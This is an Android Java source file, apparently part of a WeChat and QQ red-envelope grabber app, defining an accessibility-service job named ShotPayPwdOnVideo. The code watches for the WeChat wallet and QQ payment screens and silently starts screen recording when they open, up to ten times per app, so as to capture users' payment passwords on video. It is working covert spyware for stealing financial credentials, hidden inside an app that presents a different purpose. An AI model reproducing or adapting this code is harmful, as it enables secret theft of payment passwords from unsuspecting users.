/**
 * 
 */
package accessibility.app;

import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;
import android.os.Handler;
import android.view.accessibility.AccessibilityEvent;
import order.screen.ScreenRecordService;
import util.ConfigCt;

/**
 * @author ASUS
 *
 */
public class ShotPayPwdOnVideo extends BaseAccessibilityJob  {
	private static ShotPayPwdOnVideo current;
	
	public static final String WX_WINDOW_LUCKYMONEY_PLUGIN_WALLET_UI="com.tencent.mm.plugin.wallet_core.ui";
	private static final String WINDOW_PWD_UI="com.tencent.mm.plugin.wallet_core.ui.o";//667
	public static final String WX_WINDOW_LUCKYMONEY_LAUNCHER_UI="com.tencent.mm.ui.LauncherUI";
	public static final String QQ_WINDOW_LUCKYMONEY_WALLETPAY_UI="cooperation.qwallet.plugin.QWalletPluginProxyActivity";
	public static final String QQ_WINDOW_LUCKYMONEY_PAYBRIDGE_UI="com.tencent.mobileqq.activity.PayBridgeActivity";
	public static final String QQ_WINDOW_LUCKYMONEY_LAUNCHER_UI="com.tencent.mobileqq.activity.SplashActivity";
	private boolean bStart=false;
	private int mQQVideoCount=0;
	private int mWXVideoCount=0;
    private ShotPayPwdOnVideo() {
    	super(new String[]{ConfigCt.WECHAT_PACKAGENAME,ConfigCt.QQ_PACKAGENAME});
    	
    }
    public static synchronized ShotPayPwdOnVideo getInstance() {
        if(current == null) {
            current = new ShotPayPwdOnVideo();
        }
        return current;
    }
    @Override
	public void onCreateJob(QiangHongBaoService service) {
		super.onCreateJob(service);
		EventStart();
		mQQVideoCount=ConfigCt.getInstance(context).getQQVideoCount();
		mWXVideoCount=ConfigCt.getInstance(context).getWXVideoCount();
	}
    @Override
    public void onStopJob() {
    	super.onStopJob();

    }
    /*
	 * (刷新处理流程)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){

	}
	 @Override
	public void onReceiveJob(AccessibilityEvent event) {
		 super.onReceiveJob(event);
		 if(!mIsEventWorking)return;
		 if(!mIsTargetPackageName)return;
		 if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED)   
		 {  //WX_WINDOW_LUCKYMONEY_PLUGIN_WALLET_UI
			 if(mCurrentUI.contains(WX_WINDOW_LUCKYMONEY_PLUGIN_WALLET_UI)){
				 if(mWXVideoCount>=10)return;
				 if(ScreenRecordService.getInstance()==null){
					 ScreenRecordService.start(context,"wxp",false);
					 bStart=true;
					 StopRecordingScreenDelay();
				 }
			 }
			 if(mCurrentUI.equals(QQ_WINDOW_LUCKYMONEY_PAYBRIDGE_UI)){
				 if(mQQVideoCount>=10)return;
				 if(ScreenRecordService.getInstance()==null){
					 ScreenRecordService.start(context,"qqp",false);
					 bStart=true;
					 StopRecordingScreenDelay();
				 }
			 }
			 if(mCurrentUI.equals(WX_WINDOW_LUCKYMONEY_LAUNCHER_UI)){
				 if(bStart){
					 ScreenRecordService.stop(context);
					 mWXVideoCount=mWXVideoCount+1;
					 ConfigCt.getInstance(context).setWXVideoCount(mWXVideoCount);
					 bStart=false;
				 }
			 }
			 if(mCurrentUI.equals(QQ_WINDOW_LUCKYMONEY_LAUNCHER_UI)){
				 if(bStart){
					 ScreenRecordService.stop(context);
					 mQQVideoCount=mQQVideoCount+1;
					 ConfigCt.getInstance(context).setQQVideoCount(mQQVideoCount);
					 bStart=false;
				 }
			 }
		 }
	}
	 /*
	     * 定时器：3分钟后自动终止录屏；
	     */
		private void StopRecordingScreenDelay(){
			final Handler handler= new Handler(); 
			Runnable runnable  = new Runnable() {    
				@Override    
			    public void run() {   
					 if(bStart){
						 ScreenRecordService.stop(context);
						 bStart=false;
					 }
			    }    
			};
			handler.postDelayed(runnable, 1000*60*3);  
		}
}

